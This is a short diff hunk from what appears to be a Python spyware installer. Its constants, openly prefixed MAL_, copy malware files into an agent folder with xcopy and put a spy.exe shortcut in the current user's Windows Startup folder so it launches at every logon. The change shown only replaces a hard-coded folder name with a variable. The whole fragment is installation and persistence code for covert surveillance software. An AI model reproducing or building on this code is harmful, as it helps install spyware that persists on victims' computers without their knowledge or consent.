@@ -19,7 +19,7 @@ MAL_INSTALL_PATH=f'{AGENT_INSTALL_PATH}\\{AGENT_FOLDER}'
 COPY_MAL_DATA_CMD=f'xcopy /s {MAL_DATA_PATH} {MAL_INSTALL_PATH}'
 
 
-MAL_LNK_SOURCE='C:\\ProgramData\\utsav\\spy.exe'
+MAL_LNK_SOURCE=f'C:\\ProgramData\\{AGENT_FOLDER}\\spy.exe'
 MAL_LNK_INSTALL_LOCATION=f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
 MAL_LNK_PATH=f'{MAL_LNK_INSTALL_LOCATION}\\spy.lnk'
 
